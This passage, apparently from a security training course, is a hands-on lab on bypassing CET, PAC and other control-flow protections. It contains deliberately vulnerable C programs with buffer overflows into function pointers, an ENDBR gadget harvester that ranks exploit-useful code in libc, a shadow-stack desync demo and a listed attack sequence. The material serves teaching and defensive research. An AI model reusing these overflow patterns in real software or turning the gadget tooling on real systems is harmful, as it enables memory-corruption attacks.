# Tutorial: CFI & Hardware Mitigation Bypass — Hands-On Lab

> **Source document:** `domain4_chapter4B_cfi_hardware_bypass.md`
> **Scope:** Intel CET (shadow stack + IBT) bypass, ARM PAC bypass (PACMAN, signing oracles, brute-force), ARM BTI bypass, ARM MTE bypass, Microsoft CFG/XFG bypass, Clang CFI bypass, grsecurity RAP analysis, detection engineering for CFI violations, deployment verification, CI/CD CFI gates.
> **Audience:** Exploit developers, detection engineers, platform security architects.
> **Prerequisites:** Domain 4 Chapter 4A lab (ROP/JOP/SROP mechanics), Domain 1 (ELF/PE binary formats), Domain 2 (process memory, page tables), Domain 7 (speculative execution basics for PACMAN exercises).

---

## Lab Environment Setup

### VM / Container Requirements

| VM | Role | OS | Hardware/Emulation |
|----|------|----|--------------------|
| `cfi-x86` | Intel CET testing | Ubuntu 24.04+ (kernel 6.6+) | Intel 12th-gen+ (Alder Lake) or QEMU with `-cpu host` on CET-capable host |
| `cfi-arm` | ARM PAC/BTI/MTE testing | Ubuntu 24.04 aarch64 or Android 14+ emulator | Cortex-X4+ / Apple M-series (real hardware preferred), or QEMU `-cpu max` for PAC/BTI emulation |
| `cfi-win` | Windows CFG/XFG/CET testing | Windows 11 22H2+ | Intel 12th-gen+ (HEST support) |

**Note:** Many exercises include conceptual/analysis components that work on any x86_64 Linux without CET hardware. Hardware-dependent exercises are marked with `[HW-REQUIRED]`.

### Tool Installation Script

```bash
#!/usr/bin/env bash
# setup_cfi_lab.sh — Install all tools for CFI bypass lab.
set -euo pipefail

echo "[*] CFI Bypass Lab — Environment Setup"
echo "    Target: $(uname -m) / $(uname -r)"

# Core compilation toolchain
sudo apt-get update && sudo apt-get install -y \
    build-essential clang lld llvm \
    gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu \
    nasm gdb python3-pip python3-venv \
    libelf-dev libcapstone-dev \
    linux-tools-common linux-tools-$(uname -r) \
    bpftrace bpfcc-tools libbpf-dev \
    qemu-user qemu-user-static

# Python analysis tools
python3 -m venv ~/cfi_lab_venv
source ~/cfi_lab_venv/bin/activate
pip install --upgrade pip
pip install capstone pyelftools pefile pwntools ropper keystone-engine angr

# ROPgadget
pip install ROPgadget

# GDB enhancement
git clone https://github.com/pwndbg/pwndbg.git ~/tools/pwndbg 2>/dev/null || true
cd ~/tools/pwndbg && ./setup.sh

# one_gadget (Ruby gem)
sudo apt-get install -y ruby ruby-dev
sudo gem install one_gadget

# Ropper standalone
pip install ropper

# rp++ (pre-built)
RPPP_VER="2.1.4"
wget -qO ~/tools/rp-lin "https://github.com/0vercl0k/rp/releases/download/v${RPPP_VER}/rp-lin-x64" 2>/dev/null || true
chmod +x ~/tools/rp-lin 2>/dev/null || true

# CET verification tools
echo "[*] Checking CET hardware support..."
if grep -q 'shstk\|ibt' /proc/cpuinfo 2>/dev/null; then
    echo "  [OK] CET supported: $(grep -oE 'shstk|ibt' /proc/cpuinfo | sort -u | tr '\n' ' ')"
else
    echo "  [!] CET NOT detected in /proc/cpuinfo — hardware exercises will use emulation"
fi

# Check kernel CET support
if [ -f /proc/sys/kernel/shstk ]; then
    echo "  [OK] Kernel shadow stack support available"
fi
dmesg 2>/dev/null | grep -i "cet\|ibt\|shadow.stack" | tail -5 || true

# AArch64 cross-compilation check
if command -v aarch64-linux-gnu-gcc &>/dev/null; then
    echo "  [OK] AArch64 cross-compiler available"
fi

echo ""
echo "[*] Setup complete. Activate venv: source ~/cfi_lab_venv/bin/activate"
```

### Vulnerable Binaries Compilation Script

```bash
#!/usr/bin/env bash
# compile_cfi_targets.sh — Build vulnerable binaries at various CFI protection levels.
set -euo pipefail
mkdir -p ~/cfi_lab/targets
cd ~/cfi_lab/targets

echo "[*] Compiling CFI lab targets..."

# === TARGET 1: No CFI protection (baseline) ===
cat > vuln_no_cfi.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef void (*func_ptr)(const char *);

void safe_print(const char *msg) { printf("Safe: %s\n", msg); }
void dangerous_exec(const char *cmd) { system(cmd); }

struct dispatch_table {
    func_ptr handler;
    char name[64];
};

int main(int argc, char **argv) {
    struct dispatch_table dt;
    dt.handler = safe_print;
    strcpy(dt.name, "default");
    
    if (argc > 1) {
        /* Buffer overflow: overwrite handler pointer */
        printf("Enter name: ");
        gets(dt.name);  /* Intentionally vulnerable */
    }
    
    dt.handler("Hello from handler");
    return 0;
}
EOF
gcc -fno-stack-protector -no-pie -o vuln_no_cfi vuln_no_cfi.c

# === TARGET 2: CET IBT enabled ===
cat > vuln_ibt_only.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

typedef void (*func_ptr)(const char *);

void safe_print(const char *msg) { printf("Safe: %s\n", msg); }
void admin_action(const char *cmd) { printf("ADMIN: %s\n", cmd); system(cmd); }
void log_message(const char *msg) { fprintf(stderr, "LOG: %s\n", msg); }

struct vtable {
    func_ptr handlers[4];
};

struct object {
    struct vtable *vt;
    char data[128];
};

int main(int argc, char **argv) {
    struct vtable vt = { .handlers = {safe_print, log_message, admin_action, NULL} };
    struct object obj = { .vt = &vt };
    strcpy(obj.data, "initial");
    
    if (argc > 1) {
        /* Overflow into vtable pointer or entries */
        printf("Input data: ");
        read(0, obj.data, 256);  /* overflow */
    }
    
    obj.vt->handlers[0]("dispatch call");
    return 0;
}
EOF
gcc -fcf-protection=full -O2 -o vuln_ibt_only vuln_ibt_only.c 2>/dev/null || \
gcc -O2 -o vuln_ibt_only vuln_ibt_only.c
echo "  vuln_ibt_only — built $(readelf -n vuln_ibt_only 2>/dev/null | grep -oE 'IBT|SHSTK' | tr '\n' ' ')"

# === TARGET 3: Full CET (IBT + SHSTK) ===
cat > vuln_full_cet.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <setjmp.h>
#include <signal.h>

static jmp_buf recovery;
static volatile int fault_count = 0;

void handler(int sig) {
    fault_count++;
    longjmp(recovery, 1);
}

void target_function(void) {
    char buf[64];
    printf("Enter data: ");
    read(0, buf, 256);  /* Stack buffer overflow */
}

int main(void) {
    signal(SIGSEGV, handler);
    
    if (setjmp(recovery) == 0) {
        target_function();
    } else {
        printf("Recovered from fault #%d\n", fault_count);
    }
    
    printf("Program continues normally\n");
    return 0;
}
EOF
gcc -fcf-protection=full -O2 -o vuln_full_cet vuln_full_cet.c 2>/dev/null || \
gcc -O2 -o vuln_full_cet vuln_full_cet.c
echo "  vuln_full_cet — built $(readelf -n vuln_full_cet 2>/dev/null | grep -oE 'IBT|SHSTK' | tr '\n' ' ')"

# === TARGET 4: Clang CFI instrumented ===
cat > vuln_clang_cfi.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef int (*transform_fn)(int);

int double_it(int x) { return x * 2; }
int square_it(int x) { return x * x; }
int exec_cmd(int x) { system("/bin/sh"); return x; }  /* Same prototype! */

struct processor {
    transform_fn fn;
    int value;
    char padding[64];
};

int main(int argc, char **argv) {
    struct processor p = { .fn = double_it, .value = 42 };
    
    if (argc > 1) {
        /* Heap-simulated overflow into fn pointer */
        read(0, &p, sizeof(p) + 64);  /* Overflow */
    }
    
    int result = p.fn(p.value);
    printf("Result: %d\n", result);
    return 0;
}
EOF
# Build with Clang CFI if available
if command -v clang &>/dev/null; then
    clang -fsanitize=cfi-icall -flto -fvisibility=hidden \
          -fcf-protection=full -O2 -o vuln_clang_cfi vuln_clang_cfi.c 2>/dev/null || \
    clang -O2 -o vuln_clang_cfi vuln_clang_cfi.c
    echo "  vuln_clang_cfi — Clang CFI build"
else
    gcc -O2 -o vuln_clang_cfi vuln_clang_cfi.c
    echo "  vuln_clang_cfi — GCC fallback (no CFI)"
fi

# === TARGET 5: Signal handler desync target ===
cat > vuln_signal_desync.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>

static jmp_buf recovery_buf;
static volatile int sig_count = 0;

void sig_handler(int sig) {
    sig_count++;
    /* longjmp without consuming CET restore token */
    longjmp(recovery_buf, sig_count);
}

void vulnerable_io(void) {
    char buf[32];
    printf("Input (%d): ", sig_count);
    fflush(stdout);
    ssize_t n = read(0, buf, 256);  /* overflow */
    printf("Got %zd bytes\n", n);
}

int main(void) {
    struct sigaction sa = {0};
    sa.sa_handler = sig_handler;
    sigaction(SIGUSR1, &sa, NULL);
    sigaction(SIGSEGV, &sa, NULL);
    
    printf("PID: %d\n", getpid());
    
    int rv = setjmp(recovery_buf);
    if (rv == 0) {
        vulnerable_io();
    } else {
        printf("Recovered (count=%d)\n", rv);
        if (rv < 5) {
            vulnerable_io();
        }
    }
    
    return 0;
}
EOF
gcc -fcf-protection=full -O2 -o vuln_signal_desync vuln_signal_desync.c 2>/dev/null || \
gcc -O2 -o vuln_signal_desync vuln_signal_desync.c
echo "  vuln_signal_desync — signal desync target"

# === TARGET 6: ENDBR-gadget-rich binary (large binary for analysis) ===
cat > endbr_rich.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

/* Many small functions to create ENDBR gadgets */
void fn_pop_rdi(const char *arg) { printf("%s\n", arg); }
void fn_pop_rsi(const char *a, const char *b) { printf("%s %s\n", a, b); }
void fn_syscall_wrapper(int nr) { /* placeholder */ }
void fn_write_mem(void *dst, const void *src, size_t n) { memcpy(dst, src, n); }
void fn_exec(const char *cmd) { system(cmd); }
void fn_open_file(const char *path) { open(path, O_RDONLY); }
void fn_read_data(int fd, void *buf, size_t n) { read(fd, buf, n); }
void fn_setuid_call(uid_t uid) { setuid(uid); }
void fn_chmod_call(const char *p, mode_t m) { chmod(p, m); }
void fn_unlink_call(const char *p) { unlink(p); }
void fn_nop1(void) { asm volatile("nop"); }
void fn_nop2(void) { asm volatile("nop; nop"); }
void fn_ret_42(void) { /* just returns */ }

typedef void (*generic_fn)(void);
struct dispatch { generic_fn table[16]; };

int main(int argc, char **argv) {
    struct dispatch d;
    d.table[0] = (generic_fn)fn_pop_rdi;
    d.table[1] = (generic_fn)fn_exec;
    d.table[2] = (generic_fn)fn_write_mem;
    d.table[3] = fn_nop1;
    
    int idx = 0;
    if (argc > 1) idx = atoi(argv[1]) % 16;
    
    if (d.table[idx]) d.table[idx]();
    return 0;
}
EOF
gcc -fcf-protection=full -O1 -o endbr_rich endbr_rich.c 2>/dev/null || \
gcc -O1 -o endbr_rich endbr_rich.c
echo "  endbr_rich — large ENDBR gadget surface"

# === TARGET 7: AArch64 PAC target (cross-compiled) ===
if command -v aarch64-linux-gnu-gcc &>/dev/null; then
cat > vuln_pac_arm64.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef void (*callback_t)(void *);
struct handler_entry { callback_t cb; void *ctx; char name[64]; };

void safe_handler(void *ctx) { printf("Safe: %p\n", ctx); }
void admin_handler(void *ctx) { system((char *)ctx); }

void register_handler(struct handler_entry *e, callback_t fn, void *ctx) {
    e->cb = fn;
    e->ctx = ctx;
}

void dispatch_handler(struct handler_entry *e) {
    if (e->cb) e->cb(e->ctx);
}

int main(int argc, char **argv) {
    struct handler_entry entry;
    register_handler(&entry, safe_handler, NULL);
    strcpy(entry.name, "default");
    
    if (argc > 1) {
        read(0, entry.name, 256);  /* overflow into cb/ctx */
    }
    
    dispatch_handler(&entry);
    return 0;
}
EOF
aarch64-linux-gnu-gcc -mbranch-protection=standard -O2 \
    -o vuln_pac_arm64 vuln_pac_arm64.c 2>/dev/null && \
    echo "  vuln_pac_arm64 — AArch64 PAC+BTI target" || \
    echo "  [!] vuln_pac_arm64 — cross-compile failed"
fi

# === TARGET 8: MTE-enabled allocation target ===
if command -v aarch64-linux-gnu-gcc &>/dev/null; then
cat > vuln_mte_heap.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

struct metadata { int type; int length; };
struct payload  { char data[48]; struct metadata *meta; };

int main(int argc, char **argv) {
    struct payload *p = malloc(sizeof(struct payload));
    p->meta = malloc(sizeof(struct metadata));
    p->meta->type = 1;
    p->meta->length = 48;
    
    printf("payload @ %p, meta @ %p\n", p, p->meta);
    printf("Tag payload: 0x%x, Tag meta: 0x%x\n",
           (unsigned)((uintptr_t)p >> 56) & 0xF,
           (unsigned)((uintptr_t)p->meta >> 56) & 0xF);
    
    if (argc > 1) {
        /* Overflow: write past p->data into p->meta pointer */
        size_t len = atoi(argv[1]);
        read(0, p->data, len);  /* MTE should catch cross-granule overflow */
    }
    
    printf("meta->type = %d\n", p->meta->type);
    free(p->meta);
    free(p);
    return 0;
}
EOF
aarch64-linux-gnu-gcc -march=armv8.5-a+memtag -fsanitize=memtag-heap \
    -O2 -o vuln_mte_heap vuln_mte_heap.c 2>/dev/null && \
    echo "  vuln_mte_heap — AArch64 MTE heap target" || \
    echo "  [!] vuln_mte_heap — MTE compile failed (needs clang 14+)"
fi

echo ""
echo "[*] All targets compiled in ~/cfi_lab/targets/"
ls -la ~/cfi_lab/targets/
```

### Environment Verification

```bash
#!/usr/bin/env bash
# verify_cfi_lab.sh — Verify lab environment is operational.
set -euo pipefail

echo "=== CFI Lab Environment Verification ==="
PASS=0; FAIL=0

check() {
    if eval "$2" &>/dev/null; then
        echo "  [OK] $1"; PASS=$((PASS+1))
    else
        echo "  [!!] $1"; FAIL=$((FAIL+1))
    fi
}

check "GCC installed" "gcc --version"
check "Clang installed" "clang --version"
check "Python3 + capstone" "python3 -c 'import capstone'"
check "Python3 + pyelftools" "python3 -c 'from elftools.elf.elffile import ELFFile'"
check "Python3 + pwntools" "python3 -c 'from pwn import *'"
check "ROPgadget" "ROPgadget --version"
check "Ropper" "ropper --version"
check "GDB + pwndbg" "gdb -batch -ex 'python import pwndbg' 2>&1 | grep -v Error"
check "readelf" "readelf --version"
check "objdump" "objdump --version"
check "AArch64 cross-compiler" "aarch64-linux-gnu-gcc --version"
check "perf available" "perf --version"
check "bpftrace available" "bpftrace --version"

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ $FAIL -eq 0 ] && echo "Environment ready." || echo "Fix failures above before proceeding."
```

---

## PART A: OFFENSIVE — CFI Bypass Techniques

### Exercise 1: ENDBR64 Gadget Harvesting and Classification

**Objective:** Systematically catalog exploitable ENDBR64 landing pads in system libraries to quantify IBT's residual attack surface.

**Step 1: Build the ENDBR harvester.**

```python
#!/usr/bin/env python3
"""endbr_harvest.py — ENDBR64 gadget harvester and classifier.
Scans ELF binaries for ENDBR64 landing pads and classifies the
instruction sequences by exploit utility under IBT enforcement.
"""

import sys
import struct
from collections import Counter, defaultdict
from pathlib import Path

from capstone import Cs, CS_ARCH_X86, CS_MODE_64
from elftools.elf.elffile import ELFFile

ENDBR64_BYTES = b"\xf3\x0f\x1e\xfa"
ENDBR32_BYTES = b"\xf3\x0f\x1e\xfb"
GADGET_WINDOW = 20

CLASS_SYSCALL    = "syscall"
CLASS_REGCTL     = "reg-control"
CLASS_MEMWRITE   = "mem-write"
CLASS_STACKPIVOT = "stack-pivot"
CLASS_RET        = "ret-short"
CLASS_CALL       = "call-chain"
CLASS_WRSS       = "wrss-capable"
CLASS_SETUID     = "priv-escalation"
CLASS_EXEC       = "exec-family"
CLASS_OTHER      = "other"

ARG_REGS = {"rdi", "rsi", "rdx", "rcx", "r8", "r9", "r10"}
PIVOT_MNEMONICS = {"xchg", "leave"}
EXEC_SYMBOLS = {"system", "execve", "execvp", "popen", "dlopen"}


def classify_gadget(instructions, symbol_name=""):
    labels = set()
    for i, insn in enumerate(instructions):
        mn = insn.mnemonic
        ops = insn.op_str

        if mn == "syscall" or (mn == "int" and "0x80" in ops):
            labels.add(CLASS_SYSCALL)

        if mn == "pop" and any(r in ops for r in ARG_REGS):
            labels.add(CLASS_REGCTL)
        if mn == "mov" and "," in ops:
            dst = ops.split(",")[0].strip()
            if dst in ARG_REGS:
                labels.add(CLASS_REGCTL)

        if mn in ("mov", "movabs") and ops.startswith("["):
            labels.add(CLASS_MEMWRITE)
        if mn in ("stos", "stosb", "stosq"):
            labels.add(CLASS_MEMWRITE)

        if mn in PIVOT_MNEMONICS and "rsp" in ops:
            labels.add(CLASS_STACKPIVOT)
        if mn == "mov" and ops.startswith("rsp"):
            labels.add(CLASS_STACKPIVOT)

        if mn == "ret" and i < 6:
            labels.add(CLASS_RET)

        if mn == "call":
            labels.add(CLASS_CALL)

        if mn == "wrss" or (mn == "wrssq"):
            labels.add(CLASS_WRSS)

    if any(sym in symbol_name.lower() for sym in EXEC_SYMBOLS):
        labels.add(CLASS_EXEC)
    if "setuid" in symbol_name.lower() or "setgid" in symbol_name.lower():
        labels.add(CLASS_SETUID)

    if not labels:
        labels.add(CLASS_OTHER)
    return labels


def get_symbol_at(elf, addr):
    """Resolve symbol name at address."""
    symtab = elf.get_section_by_name('.symtab') or elf.get_section_by_name('.dynsym')
    if not symtab:
        return ""
    for sym in symtab.iter_symbols():
        if sym['st_value'] == addr and sym['st_size'] > 0:
            return sym.name
    return ""


def scan_elf(path):
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True
    results = []

    with open(path, "rb") as f:
        elf = ELFFile(f)
        for section in elf.iter_sections():
            if not (section["sh_flags"] & 0x4):
                continue
            data = section.data()
            base = section["sh_addr"]
            offset = 0
            while offset < len(data) - 4:
                if data[offset:offset + 4] != ENDBR64_BYTES:
                    offset += 1
                    continue

                addr = base + offset
                window = data[offset:offset + 128]
                insns = list(md.disasm(window, addr))
                if len(insns) < 2:
                    offset += 4
                    continue

                sym_name = get_symbol_at(elf, addr)
                following = insns[1:GADGET_WINDOW + 1]
                labels = classify_gadget(following, sym_name)
                asm_text = "; ".join(
                    f"{i.mnemonic} {i.op_str}" for i in insns[:GADGET_WINDOW + 1]
                )
                results.append({
                    "addr": addr,
                    "symbol": sym_name,
                    "labels": labels,
                    "asm": asm_text,
                })
                offset += 4

    return results


def report(path, gadgets):
    total = len(gadgets)
    if total == 0:
        print(f"  No ENDBR64 gadgets found in {path}")
        return

    counts = Counter()
    for g in gadgets:
        for label in g["labels"]:
            counts[label] += 1

    useful = sum(1 for g in gadgets
                 if g["labels"] - {CLASS_OTHER, CLASS_RET, CLASS_CALL})

    print(f"\n{'=' * 72}")
    print(f" ENDBR Gadget Report: {Path(path).name}")
    print(f" Total ENDBR64: {total}  Exploit-useful: {useful}  "
          f"Ratio: {useful / total * 100:.1f}%")
    print(f"{'-' * 72}")
    print(f" Category Breakdown:")
    for label, count in counts.most_common():
        bar = '█' * (count * 40 // total)
        print(f"   {label:<18s} {count:>5d} ({count / total * 100:>5.1f}%) {bar}")

    print(f"\n{'─' * 72}")
    print(f" High-Value Gadgets (top examples per category):")
    for pri in [CLASS_SYSCALL, CLASS_STACKPIVOT, CLASS_MEMWRITE,
                CLASS_REGCTL, CLASS_EXEC, CLASS_WRSS, CLASS_SETUID]:
        examples = [g for g in gadgets if pri in g["labels"]]
        if examples:
            print(f"\n  [{pri}] — {len(examples)} total")
            for g in examples[:3]:
                sym_str = f" <{g['symbol']}>" if g['symbol'] else ""
                print(f"    0x{g['addr']:016x}{sym_str}")
                print(f"      {g['asm'][:100]}")

    print(f"\n{'=' * 72}")


def attack_surface_summary(all_results):
    """Summarize combined attack surface across multiple libraries."""
    print(f"\n{'#' * 72}")
    print(f" COMBINED IBT ATTACK SURFACE SUMMARY")
    print(f"{'#' * 72}")
    total_gadgets = sum(len(r) for r in all_results.values())
    total_useful = sum(
        sum(1 for g in gadgets if g["labels"] - {CLASS_OTHER, CLASS_RET, CLASS_CALL})
        for gadgets in all_results.values()
    )
    print(f" Total ENDBR gadgets across all libs: {total_gadgets}")
    print(f" Exploit-useful gadgets: {total_useful}")
    print(f" Attack surface reduction vs unrestricted ROP: ~{100 - (total_useful * 100 // max(total_gadgets * 10, 1))}%")

    # Highlight exec-family and syscall gadgets
    exec_total = sum(
        sum(1 for g in gadgets if CLASS_EXEC in g["labels"] or CLASS_SYSCALL in g["labels"])
        for gadgets in all_results.values()
    )
    print(f" Direct code-execution gadgets (exec/syscall): {exec_total}")
    print(f"{'#' * 72}\n")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <elf-binary> [<elf-binary> ...]")
        print(f"  Example: {sys.argv[0]} /usr/lib/x86_64-linux-gnu/libc.so.6 /usr/bin/ls")
        sys.exit(1)

    all_results = {}
    for target in sys.argv[1:]:
        gadgets = scan_elf(target)
        all_results[target] = gadgets
        report(target, gadgets)

    if len(all_results) > 1:
        attack_surface_summary(all_results)
```

**Step 2: Run against system libc.**

```bash
source ~/cfi_lab_venv/bin/activate
python3 endbr_harvest.py /usr/lib/x86_64-linux-gnu/libc.so.6
```

**Expected output:** 2,300–2,800 ENDBR64 landing pads. 15–25% with register-control sequences. 3–5% reaching syscall within 20 instructions. 5–15 stack-pivot gadgets.

**Step 3: Scan multiple libraries loaded by a target process.**

```bash
# Get all shared libraries of a running process
PID=$(pidof bash)  # or any target
LIBS=$(awk '$6!="" && $2~/x/{print $6}' /proc/$PID/maps | sort -u | head -20)
python3 endbr_harvest.py $LIBS
```

**Verification:** The combined report shows the full ENDBR-gadget attack surface available to an attacker who has hijacked a forward-edge pointer in that process. This quantifies IBT's residual risk.

---

### Exercise 2: Shadow Stack Desynchronization via Signal Handlers

**Objective:** Demonstrate how repeated `longjmp` from signal handlers can desynchronize the CET shadow stack, and analyze the exploitable window.

**Step 1: Compile the desync analysis tool.**

```c
/* shadow_stack_desync_analyzer.c
 * Demonstrates and measures shadow stack desync via signal+longjmp.
 * Compile: gcc -fcf-protection=full -O0 -g -o ss_desync shadow_stack_desync_analyzer.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>

#ifdef __CET__
#include <immintrin.h>
#endif

static jmp_buf recovery_buf;
static volatile int sig_count = 0;
static volatile uint64_t ssp_values[64];
static volatile int ssp_idx = 0;

static inline uint64_t read_ssp(void) {
#ifdef __CET__
    uint64_t ssp;
    asm volatile("rdsspq %0" : "=r"(ssp));
    return ssp;
#else
    return 0;  /* CET not available */
#endif
}

static void signal_handler(int sig) {
    sig_count++;
    
    /* Record SSP at signal entry */
    uint64_t current_ssp = read_ssp();
    if (ssp_idx < 64) {
        ssp_values[ssp_idx++] = current_ssp;
    }
    
    printf("  [SIG #%d] SSP=0x%016lx (signal handler entry)\n",
           sig_count, current_ssp);
    
    /* longjmp discards signal frame without consuming CET restore token.
     * glibc compensates via INCSSP using __shadow_stack_offset in jmp_buf.
     * If this offset is corrupted, SSP advances by wrong amount. */
    longjmp(recovery_buf, sig_count);
}

static void nested_calls(int depth) {
    uint64_t ssp = read_ssp();
    printf("  Depth %d: SSP=0x%016lx (delta from main: %ld slots)\n",
           depth, ssp,
           (ssp_values[0] != 0) ? (long)(ssp_values[0] - ssp) / 8 : 0);
    
    if (depth > 0) {
        nested_calls(depth - 1);
    }
}

int main(void) {
    struct sigaction sa = {0};
    sa.sa_handler = signal_handler;
    sa.sa_flags = SA_NODEFER;  /* Allow re-entrant signals for testing */
    sigaction(SIGUSR1, &sa, NULL);
    
    printf("=== Shadow Stack Desync Analysis ===\n");
    printf("CET support: %s\n",
#ifdef __CET__
           "ENABLED"
#else
           "DISABLED (compiled without -fcf-protection)"
#endif
    );
    
    uint64_t initial_ssp = read_ssp();
    printf("Initial SSP: 0x%016lx\n", initial_ssp);
    ssp_values[0] = initial_ssp;
    
    printf("\n--- Phase 1: Normal call/return (baseline) ---\n");
    nested_calls(3);
    printf("SSP after normal return: 0x%016lx (should match initial)\n", read_ssp());
    
    printf("\n--- Phase 2: Signal + longjmp desync test ---\n");
    printf("Sending SIGUSR1 repeatedly with longjmp recovery...\n");
    
    int rv = setjmp(recovery_buf);
    if (rv == 0) {
        /* First time: trigger signal */
        raise(SIGUSR1);
    } else {
        /* Returned via longjmp */
        uint64_t post_ssp = read_ssp();
        printf("  Post-longjmp SSP: 0x%016lx (rv=%d)\n", post_ssp, rv);
        
        if (rv < 5) {
            /* Trigger more signals to accumulate desync */
            raise(SIGUSR1);
        }
    }
    
    printf("\n--- Phase 3: SSP tracking summary ---\n");
    printf("Total signals handled: %d\n", sig_count);
    printf("SSP values recorded:\n");
    for (int i = 0; i < ssp_idx && i < 10; i++) {
        printf("  [%d] 0x%016lx", i, ssp_values[i]);
        if (i > 0) printf(" (delta: %+ld slots)", 
                          (long)(ssp_values[i] - ssp_values[i-1]) / 8);
        printf("\n");
    }
    
    uint64_t final_ssp = read_ssp();
    printf("\nFinal SSP: 0x%016lx (delta from initial: %ld slots)\n",
           final_ssp, (long)(initial_ssp - final_ssp) / 8);
    
    if (final_ssp != initial_ssp) {
        printf("[!] DESYNC DETECTED: SSP drifted by %ld slots\n",
               (long)(initial_ssp - final_ssp) / 8);
        printf("    This indicates shadow stack desynchronization.\n");
        printf("    In a real exploit: attacker corrupts jmp_buf.__shadow_stack_offset\n");
        printf("    to control the INCSSP amount, aligning SSP with a stale entry\n");
        printf("    matching their crafted return address on the regular stack.\n");
    } else {
        printf("[OK] SSP correctly synchronized (glibc INCSSP compensation working)\n");
    }
    
    return 0;
}
```

**Step 2: Compile and test.**

```bash
gcc -fcf-protection=full -O0 -g -o ss_desync shadow_stack_desync_analyzer.c
./ss_desync
```

**Step 3: Analyze the jmp_buf shadow stack offset field.**

```python
#!/usr/bin/env python3
"""jmpbuf_ssp_analysis.py — Analyze jmp_buf layout for shadow stack offset field.
Maps the glibc jmp_buf structure to identify the field an attacker would corrupt
to control INCSSP amount during longjmp.
"""

import struct
import subprocess
import re

def get_jmpbuf_layout():
    """Extract jmp_buf structure layout from glibc headers/debug info."""
    # glibc 2.39+ jmp_buf on x86_64 includes __shadow_stack_offset
    # at a platform-specific offset within __jmp_buf
    
    # Method: compile a test program and examine with pahole/GDB
    test_src = '''
#include <setjmp.h>
#include <stdio.h>
#include <stddef.h>

int main(void) {
    jmp_buf buf;
    printf("sizeof(jmp_buf) = %zu\\n", sizeof(jmp_buf));
    printf("jmp_buf address = %p\\n", &buf);
    
    /* On glibc 2.39+ x86_64:
     * jmp_buf[0].__jmpbuf[0] = rbx
     * jmp_buf[0].__jmpbuf[1] = rbp  (mangled)
     * jmp_buf[0].__jmpbuf[2] = r12
     * jmp_buf[0].__jmpbuf[3] = r13
     * jmp_buf[0].__jmpbuf[4] = r14
     * jmp_buf[0].__jmpbuf[5] = r15
     * jmp_buf[0].__jmpbuf[6] = rsp  (mangled)
     * jmp_buf[0].__jmpbuf[7] = rip  (mangled)
     * jmp_buf[0].__saved_mask = signal mask
     * Shadow stack offset stored after __jmpbuf (platform-specific)
     */
    
    if (setjmp(buf) == 0) {
        unsigned char *raw = (unsigned char *)&buf;
        printf("Raw jmp_buf bytes (first 128):\\n");
        for (int i = 0; i < 128 && i < (int)sizeof(jmp_buf); i++) {
            printf("%02x ", raw[i]);
            if ((i + 1) % 16 == 0) printf("\\n");
        }
        printf("\\n");
    }
    return 0;
}
'''
    
    with open('/tmp/jmpbuf_test.c', 'w') as f:
        f.write(test_src)
    
    subprocess.run(['gcc', '-fcf-protection=full', '-O0', '-g',
                    '-o', '/tmp/jmpbuf_test', '/tmp/jmpbuf_test.c'],
                   capture_output=True)
    
    result = subprocess.run(['/tmp/jmpbuf_test'], capture_output=True, text=True)
    print(result.stdout)
    
    print("\n=== Attack Analysis ===")
    print("To exploit shadow stack desync, attacker must:")
    print("1. Locate jmp_buf in memory (via info leak or known offset)")
    print("2. Identify the shadow_stack_offset field")
    print("3. Corrupt it to control INCSSP amount in longjmp")
    print("4. Trigger repeated signals → longjmp with wrong INCSSP")
    print("5. SSP aligns with stale entry matching attacker's return addr")
    print("6. Next ret: both stacks agree → CET passes → hijack")
    print("\nConstraints:")
    print("- Requires write primitive to corrupt jmp_buf")
    print("- Requires ability to trigger signals")
    print("- glibc 2.39+ mangles values with pointer guard (PTR_MANGLE)")
    print("- Attacker must also leak pointer guard for this attack")

if __name__ == "__main__":
    get_jmpbuf_layout()
```

**Verification:** On CET-enabled hardware, observe SSP values drift when compensation is bypassed. On non-CET hardware, understand the conceptual attack path through SSP tracking.

---

### Exercise 3: WRSS-Based Shadow Stack Corruption

**Objective:** Demonstrate how WRSS instruction abuse defeats shadow stack protection when WRSS is enabled (e.g., in JIT processes).

**Step 1: WRSS gadget scanner.**

```python
#!/usr/bin/env python3
"""wrss_gadget_scan.py — Find WRSS instruction gadgets in binaries.
WRSS (Write Shadow Stack) can write arbitrary values to the shadow stack,
completely defeating CET backward-edge protection. This scanner finds
WRSS instructions in loaded libraries.
"""

import sys
from pathlib import Path
from capstone import Cs, CS_ARCH_X86, CS_MODE_64
from elftools.elf.elffile import ELFFile

WRSS_OPCODES = [
    b"\x0f\x38\xf6",   # WRSSQ (REX.W 0F 38 F6 /r)
    b"\x66\x0f\x38\xf5",  # WRSSD
]

def scan_for_wrss(path):
    results = []
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = True

    with open(path, "rb") as f:
        elf = ELFFile(f)
        for section in elf.iter_sections():
            if not (section["sh_flags"] & 0x4):
                continue
            data = section.data()
            base = section["sh_addr"]

            for offset in range(len(data) - 4):
                for opcode in WRSS_OPCODES:
                    if data[offset:offset + len(opcode)] == opcode:
                        addr = base + offset
                        window = data[offset:offset + 32]
                        insns = list(md.disasm(window, addr))
                        if insns:
                            asm_str = "; ".join(
                                f"{i.mnemonic} {i.op_str}" for i in insns[:5]
                            )
                            results.append({
                                "addr": addr,
                                "asm": asm_str,
                                "section": section.name
                            })
                        break
    return results


def analyze_wrss_exploitability(results, binary_name):
    print(f"\n{'=' * 60}")
    print(f" WRSS Gadget Analysis: {binary_name}")
